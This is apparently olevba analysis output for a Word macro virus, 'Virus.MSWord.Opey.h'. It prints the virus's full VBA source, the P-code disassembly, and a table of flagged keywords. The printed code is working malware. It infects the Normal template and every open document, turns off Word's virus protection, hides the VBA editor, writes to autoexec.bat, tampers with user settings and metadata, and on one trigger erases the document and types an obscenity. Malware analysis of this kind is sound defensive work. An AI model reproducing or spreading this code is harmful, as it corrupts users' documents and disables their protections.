olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Crazy_Man_02 
in file: Virus.MSWord.Opey.h - OLE stream: 'Crazy_Man_02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub greetings()
    On Error Resume Next
         If (Month(Now()) > 7) Then
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
            If ((Month(Date) = 12) And (Day(Date) > 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
                line1$ = "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 1) Then
                line1$ = "echo HAPPY HALLOWEEN !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) > 14) Then
                line1$ = "echo HAPPY VALENTINES DAY !!!"
            End If
                If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, "echo from: The Crazy Man"
                        Print #hFile, "pause"
                    Close hFile
                End If
        
         With AutoCorrect.Entries
         .Add Name:="Author", Value:="Author The Crazy Man"
         .Add Name:="President", Value:="President Mr. Josep Estrada"
         .Add Name:="M.Mla.", Value:="Metro Manila Philippines"
         .Add Name:="I am", Value:="I am The Crazy Man"
         .Add Name:="I'm", Value:="I'm The Crazy Man"
         .Add Name:="Who is", Value:="Who is the Crazy Man"
         End With
        End If
End Sub

Sub Crazy_man()
  On Error Resume Next
    Call Crazy_Man_02
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "Crazy_Man_02" Then NTInfected = True
                If (clan <> "Crazy_Man_02") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "Crazy_Man_02" Then ODInfected = True
                    If (clan <> "Crazy_Man_02") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="Crazy_Man_02", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Crazy_Man_02", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
    ActiveDocument.Activate
End Sub
Sub Crazy_Man_02()
    On Error Resume Next
     If (Month(Now()) > 7) Then
      Application.UserName = "Crazy Man"
      Application.UserAddress = "LBTMM B'99 PHILIPPINES"
      Application.UserInitials = "Crazy"
      With Dialogs(wdDialogFileSummaryInfo)
        .Author.Value = ""
        .Title.Value = ""
        .Manager.Value = ""
        .Company.Value = ""
        .Comments.Value = ""
        .Execute
    End With
        
    With Dialogs(wdDialogFileSummaryInfo)
        .Author.Value = "Crazy Man"
        .Title.Value = "Crazy"
        .Manager.Value = "MMA"
        .Company.Value = "Crazy Man Company"
        .Comments.Value = "HELLO I am the Crazy Man From the Crazy World of Computer. Don't you worry I'm not as crazy than you tink..."
        .Execute
    End With
    End If
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub filesave()
    On Error Resume Next
    Call Crazy_man
    ActiveDocument.Save
End Sub
Sub fileclose()
    On Error Resume Next
    Call Crazy_man
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call Crazy_man
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call Crazy_man
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Crazy_man
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Crazy_man
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call Crazy_man
    With Dialogs(wdDialogFileSaveAs)
        .Show
        .FileName = "Crazy Man.*"
     End With
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call Crazy_man
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub fileprint()
    On Error Resume Next
    Call Crazy_man
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call Crazy_man
End Sub

Sub ToolsMacro()
    On Error Resume Next
    Selection.WholeStory
    On Error Resume Next
    Selection.Delete Unit:=wdCharacter, Count:=1
    On Error Resume Next
    Selection.Font.Name = "Times New Roman"
    On Error Resume Next
    Selection.Font.Size = 14
    On Error Resume Next
    Selection.TypeText Text:="Aha!!! You Wan't to know my code..."
    On Error Resume Next
    Selection.TypeParagraph
    On Error Resume Next
    Selection.TypeText Text:="Kill me first"
    On Error Resume Next
    Selection.TypeParagraph
    On Error Resume Next
    Selection.Font.Size = 26
    On Error Resume Next
    Selection.Font.Bold = wdToggle
    On Error Resume Next
    If Selection.Font.Underline = wdUnderlineNone Then
        Selection.Font.Underline = wdUnderlineSingle
    Else
        Selection.Font.Underline = wdUnderlineNone
    End If
    On Error Resume Next
    Selection.TypeParagraph
    On Error Resume Next
    Selection.TypeText Text:="FUCK YOU !!!!"
    
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    On Error Resume Next
    Application.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11416 bytes
' Macros/VBA/Crazy_Man_02 - 17115 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub greetings())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #4:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	St autoexecfile$ 
' Line #5:
' 	Ld Friend 
' 	St hFile 
' Line #6:
' 	LitStr 0x0000 ""
' 	St line1$ 
' Line #7:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Gt 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #8:
' 	LitStr 0x002E "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
' 	St line1$ 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #11:
' 	LitStr 0x0018 "echo HAPPY HALLOWEEN !!!"
' 	St line1$ 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Gt 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #14:
' 	LitStr 0x001D "echo HAPPY VALENTINES DAY !!!"
' 	St line1$ 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld line1$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld autoexecfile$ 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #18:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #19:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line1$ 
' 	PrintItemNL 
' Line #20:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "echo from: The Crazy Man"
' 	PrintItemNL 
' Line #21:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #22:
' 	Ld hFile 
' 	Close 0x0001 
' Line #23:
' 	EndIfBlock 
' Line #24:
' Line #25:
' 	StartWithExpr 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	With 
' Line #26:
' 	LitStr 0x0006 "Author"
' 	ParamNamed New 
' 	LitStr 0x0014 "Author The Crazy Man"
' 	ParamNamed Value 
' 	ArgsMemCallWith Add 0x0002 
' Line #27:
' 	LitStr 0x0009 "President"
' 	ParamNamed New 
' 	LitStr 0x001B "President Mr. Josep Estrada"
' 	ParamNamed Value 
' 	ArgsMemCallWith Add 0x0002 
' Line #28:
' 	LitStr 0x0006 "M.Mla."
' 	ParamNamed New 
' 	LitStr 0x0018 "Metro Manila Philippines"
' 	ParamNamed Value 
' 	ArgsMemCallWith Add 0x0002 
' Line #29:
' 	LitStr 0x0004 "I am"
' 	ParamNamed New 
' 	LitStr 0x0012 "I am The Crazy Man"
' 	ParamNamed Value 
' 	ArgsMemCallWith Add 0x0002 
' Line #30:
' 	LitStr 0x0003 "I'm"
' 	ParamNamed New 
' 	LitStr 0x0011 "I'm The Crazy Man"
' 	ParamNamed Value 
' 	ArgsMemCallWith Add 0x0002 
' Line #31:
' 	LitStr 0x0006 "Who is"
' 	ParamNamed New 
' 	LitStr 0x0014 "Who is the Crazy Man"
' 	ParamNamed Value 
' 	ArgsMemCallWith Add 0x0002 
' Line #32:
' 	EndWith 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndSub 
' Line #35:
' Line #36:
' 	FuncDefn (Sub Crazy_man())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) Crazy_Man_02 0x0000 
' Line #39:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #41:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #42:
' 	Ld clan 
' 	LitStr 0x000C "Crazy_Man_02"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTInfected 
' 	EndIf 
' Line #43:
' 	Ld clan 
' 	LitStr 0x000C "Crazy_Man_02"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #44:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #46:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #47:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #48:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #49:
' 	Ld j 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #50:
' 	Ld clan 
' 	LitStr 0x000C "Crazy_Man_02"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ODInfected 
' 	EndIf 
' Line #51:
' 	Ld clan 
' 	LitStr 0x000C "Crazy_Man_02"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #52:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	Ld ODInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #54:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "Crazy_Man_02"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #55:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld opendoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndWith 
' Line #58:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "Crazy_Man_02"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #61:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	ArgsCall (Call) greetings 0x0000 
' Line #64:
' 	Ld ActiveDocument 
' 	ArgsMemCall Activate 0x0000 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub Crazy_Man_02())
' Line #67:
' 	OnError (Resume Next) 
' Line #68:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #69:
' 	LitStr 0x0009 "Crazy Man"
' 	Ld Application 
' 	MemSt UserName 
' Line #70:
' 	LitStr 0x0016 "LBTMM B'99 PHILIPPINES"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #71:
' 	LitStr 0x0005 "Crazy"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #72:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #73:
' 	LitStr 0x0000 ""
' 	MemLdWith Author 
' 	MemSt Value 
' Line #74:
' 	LitStr 0x0000 ""
' 	MemLdWith Title 
' 	MemSt Value 
' Line #75:
' 	LitStr 0x0000 ""
' 	MemLdWith Manager 
' 	MemSt Value 
' Line #76:
' 	LitStr 0x0000 ""
' 	MemLdWith Company 
' 	MemSt Value 
' Line #77:
' 	LitStr 0x0000 ""
' 	MemLdWith Comments 
' 	MemSt Value 
' Line #78:
' 	ArgsMemCallWith Execute 0x0000 
' Line #79:
' 	EndWith 
' Line #80:
' Line #81:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #82:
' 	LitStr 0x0009 "Crazy Man"
' 	MemLdWith Author 
' 	MemSt Value 
' Line #83:
' 	LitStr 0x0005 "Crazy"
' 	MemLdWith Title 
' 	MemSt Value 
' Line #84:
' 	LitStr 0x0003 "MMA"
' 	MemLdWith Manager 
' 	MemSt Value 
' Line #85:
' 	LitStr 0x0011 "Crazy Man Company"
' 	MemLdWith Company 
' 	MemSt Value 
' Line #86:
' 	LitStr 0x006C "HELLO I am the Crazy Man From the Crazy World of Computer. Don't you worry I'm not as crazy than you tink..."
' 	MemLdWith Comments 
' 	MemSt Value 
' Line #87:
' 	ArgsMemCallWith Execute 0x0000 
' Line #88:
' 	EndWith 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #91:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #92:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #93:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #94:
' 	EndWith 
' Line #95:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #96:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #97:
' 	EndWith 
' Line #98:
' 	OnError (Resume Next) 
' Line #99:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #100:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #101:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #102:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #103:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #104:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #105:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #106:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #107:
' 	EndSub 
' Line #108:
' 	FuncDefn (Sub filesave())
' Line #109:
' 	OnError (Resume Next) 
' Line #110:
' 	ArgsCall (Call) Crazy_man 0x0000 
' Line #111:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Sub fileclose())
' Line #114:
' 	OnError (Resume Next) 
' Line #115:
' 	ArgsCall (Call) Crazy_man 0x0000 
' Line #116:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #117:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #118:
' 	EndSub 
' Line #119:
' 	FuncDefn (Sub FileExit())
' Line #120:
' 	OnError (Resume Next) 
' Line #121:
' 	ArgsCall (Call) Crazy_man 0x0000 
' Line #122:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #123:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #124:
' 	EndSub 
' Line #125:
' 	FuncDefn (Sub FileNew())
' Line #126:
' 	OnError (Resume Next) 
' Line #127:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #128:
' 	LitDI2 0x0001 
' 	St newfile$ 
' Line #129:
' 	ArgsCall (Call) Crazy_man 0x0000 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Sub AutoOpen())
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	ArgsCall (Call) Crazy_man 0x0000 
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub AutoExec())
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	ArgsCall (Call) Crazy_man 0x0000 
' Line #138:
' 	EndSub 
' Line #139:
' 	FuncDefn (Sub FileSaveAs())
' Line #140:
' 	OnError (Resume Next) 
' Line #141:
' 	ArgsCall (Call) Crazy_man 0x0000 
' Line #142:
' 	StartWithExpr 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #143:
' 	ArgsMemCallWith Show 0x0000 
' Line #144:
' 	LitStr 0x000B "Crazy Man.*"
' 	MemStWith FileName 
' Line #145:
' 	EndWith 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub FilePageSetup())
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	ArgsCall (Call) Crazy_man 0x0000 
' Line #150:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #151:
' 	EndSub 
' Line #152:
' 	FuncDefn (Sub fileprint())
' Line #153:
' 	OnError (Resume Next) 
' Line #154:
' 	ArgsCall (Call) Crazy_man 0x0000 
' Line #155:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #156:
' 	EndSub 
' Line #157:
' 	FuncDefn (Sub FileOpen())
' Line #158:
' 	OnError (Resume Next) 
' Line #159:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #160:
' 	ArgsCall (Call) Crazy_man 0x0000 
' Line #161:
' 	EndSub 
' Line #162:
' Line #163:
' 	FuncDefn (Sub ToolsMacro())
' Line #164:
' 	OnError (Resume Next) 
' Line #165:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #166:
' 	OnError (Resume Next) 
' Line #167:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #168:
' 	OnError (Resume Next) 
' Line #169:
' 	LitStr 0x000F "Times New Roman"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #170:
' 	OnError (Resume Next) 
' Line #171:
' 	LitDI2 0x000E 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #172:
' 	OnError (Resume Next) 
' Line #173:
' 	LitStr 0x0023 "Aha!!! You Wan't to know my code..."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #174:
' 	OnError (Resume Next) 
' Line #175:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #176:
' 	OnError (Resume Next) 
' Line #177:
' 	LitStr 0x000D "Kill me first"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #178:
' 	OnError (Resume Next) 
' Line #179:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #180:
' 	OnError (Resume Next) 
' Line #181:
' 	LitDI2 0x001A 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #182:
' 	OnError (Resume Next) 
' Line #183:
' 	Ld wdToggle 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #184:
' 	OnError (Resume Next) 
' Line #185:
' 	Ld Selection 
' 	MemLd Font 
' 	MemLd Underline 
' 	Ld wdUnderlineNone 
' 	Eq 
' 	IfBlock 
' Line #186:
' 	Ld wdUnderlineSingle 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Underline 
' Line #187:
' 	ElseBlock 
' Line #188:
' 	Ld wdUnderlineNone 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Underline 
' Line #189:
' 	EndIfBlock 
' Line #190:
' 	OnError (Resume Next) 
' Line #191:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #192:
' 	OnError (Resume Next) 
' Line #193:
' 	LitStr 0x000D "FUCK YOU !!!!"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #194:
' Line #195:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #196:
' 	OnError (Resume Next) 
' Line #197:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #198:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

